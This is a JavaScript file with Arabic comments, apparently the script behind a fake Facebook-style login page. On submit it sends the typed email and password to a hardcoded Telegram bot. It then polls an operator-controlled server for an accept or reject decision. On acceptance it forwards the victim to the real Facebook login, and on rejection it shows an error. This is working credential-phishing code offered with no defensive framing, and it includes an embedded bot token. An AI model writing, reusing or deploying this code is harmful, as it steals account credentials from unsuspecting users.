// ✅ عند الضغط على زر "Log In"
document.getElementById('submit-btn').addEventListener('click', () => {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
        alert("⚠️ يرجى إدخال البريد وكلمة المرور.");
        return;
    }

    // ✅ إخفاء رسالة الخطأ إذا كانت ظاهرة
    document.getElementById('error-message').style.display = 'none';

    // إرسال البيانات إلى بوت التليجرام
    fetch('https://api.telegram.org/bot7828630167:AAG8iKwW5-NKU7OsmYDGmxip3NhhDBKLXVk/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: '5443898294',
            text: `🔐 Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}`,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Accept', callback_data: 'accept' },
                        { text: '❌ Reject', callback_data: 'reject' }
                    ]
                ]
            }
        })
    })
    .then(() => {
        console.log('📤 تم إرسال البيانات إلى البوت، ننتظر الرد...');
        checkLoginStatus(); // نبدأ التحقق بعد الإرسال فقط
    })
    .catch(error => {
        console.error("❌ فشل في إرسال البيانات إلى تيليجرام:", error);
    });
});

function checkLoginStatus() {
    const maxAttempts = 30; // أقصى عدد محاولات (حوالي دقيقة)
    let attempts = 0;

    const interval = setInterval(() => {
        attempts++;
        if (attempts > maxAttempts) {
            clearInterval(interval);
            console.warn("⏳ لم يتم الحصول على رد خلال المهلة المحددة.");
            return;
        }

        fetch('https://login-vpns.onrender.com/get-status')
            .then(res => res.json())
            .then(data => {
                if (data.accepted) {
                    clearInterval(interval);
                    console.log("✅ تم القبول، توجيه المستخدم...");

                    // إعادة تعيين الحالة
                    fetch('https://login-vpns.onrender.com/update-status?action=reset')
                        .then(() => {
                            window.location.href = 'https://www.facebook.com/login';
                        });

                } else if (data.rejected) {
                    clearInterval(interval);
                    console.log("❌ تم الرفض، عرض الرسالة للمستخدم.");

                    // عرض رسالة الخطأ
                    document.getElementById('error-message').style.display = 'block';

                    // إعادة تعيين الحالة
                    fetch('https://login-vpns.onrender.com/update-status?action=reset');
                }
            })
            .catch(err => {
                console.error('⚠️ خطأ أثناء التحقق من الحالة:', err);
            });
    }, 2000);
}
